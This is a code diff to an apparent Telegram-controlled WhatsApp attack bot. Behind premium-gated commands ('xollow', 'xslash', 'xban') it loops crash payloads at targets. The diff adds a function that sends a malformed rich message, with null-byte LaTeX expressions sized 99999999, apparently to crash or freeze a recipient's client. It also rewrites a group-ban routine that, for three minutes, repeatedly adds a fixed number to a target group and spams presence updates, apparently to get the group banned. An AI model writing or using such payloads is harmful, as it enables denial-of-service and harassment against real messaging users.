@@ -2035,6 +2035,7 @@ bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     await XvZFc(sock, target);
     await XvZFcV1(sock, target);
     await XvZFcV2(sock, target);
+    await XvZFcV3(sock, target);
     await sleep(1000);
     }
 
@@ -2167,7 +2168,7 @@ bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 
   for (let i = 0; i < 50; i++) {
     await XvZGb(sock, target);
-    awair XvZGbV1(sock, target);
+    await XvZGbV1(sock, target);
     await sleep(1500);
   }
 
@@ -2209,7 +2210,7 @@ bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async 
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 4; i++) {
+  for (let i = 0; i < 1; i++) {
     await XvZBanGb(sock, target);
     await sleep(1500);
   }
@@ -2639,6 +2640,46 @@ async function XvZFcV2(sock, target) {
     await sleep(1000);
   }
 }
+async function XvZFcV3(sock, target) {
+const XxXMsg = {
+groupStatusMessageV2: {
+message: {
+botForwardedMessage: {
+message: {
+richResponseMessage: {
+"messageType": 1,
+"submessages": [
+{
+"messageType": 8,
+"latexMetadata": {
+"text": "\0",
+"expressions": [
+{
+"latexExpression": "\0",
+"width": 99999999,
+"height": 99999999
+}
+]
+}
+}
+],
+"contextInfo": {
+"isForwarded": true,
+"forwardOrigin": 4
+}
+}
+}
+}
+}
+}
+};
+
+const msg = generateWAMessageFromContent(target, XxXMsg, {});
+await sock.relayMessage(target, msg.message, {
+messageId: msg.key.id,
+participant: { jid: target }
+});
+}
 async function XvZiOS(sock, target) {
     await sock.relayMessage('status@broadcast', {
       botForwardedMessage: {
@@ -2678,31 +2719,30 @@ async function XvZiOS(sock, target) {
       statusJidList: [target]
   })
 }
-async function XvZBanGb(sock, groupJid) {
-    if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
-    }
+async function BanGroupNewV2(sock, groupJid) {
+const startTime = Date.now();
+const duration = 3 * 60 * 1000;
+while (Date.now() - startTime < duration) {
 
-    const targets = [
-        "18188880008@s.whatsapp.net",
-        "18188880009@s.whatsapp.net",
-        "18188880010@s.whatsapp.net",
-        "18188880011@s.whatsapp.net",
-        "18188880012@s.whatsapp.net"
-    ];
-    const action = "add";
-    const maxLoop = 10;
+  if (!groupJid.endsWith('@g.us')) {
+    throw new Error('@g.us server required');
+  }
 
-    for (let i = 0; i < maxLoop; i++) {
-        for (let j = 0; j < targets.length; j++) {
-            try {
-                await sock.groupParticipantsUpdate(groupJid, [targets[j]], action);
-                await sock.sendPresenceUpdate('composing', groupJid);
-            } catch (err) {
-                console.error('error:', err.message);
-            }
-        }
-    }
+  let group = groupJid;
+
+  try {
+    await sock.groupParticipantsUpdate(
+      group,
+      ['18188880008@s.whatsapp.net'],
+      'add',
+    );
+
+    await sock.sendPresenceUpdate('composing', group);
+  } catch (err) {
+    console.error('error:', err);
+    throw err;
+  }
+ }
 }
 async function XvZGb(sock, groupJid) {
 const groupMetadata = await sock.groupMetadata(groupJid);
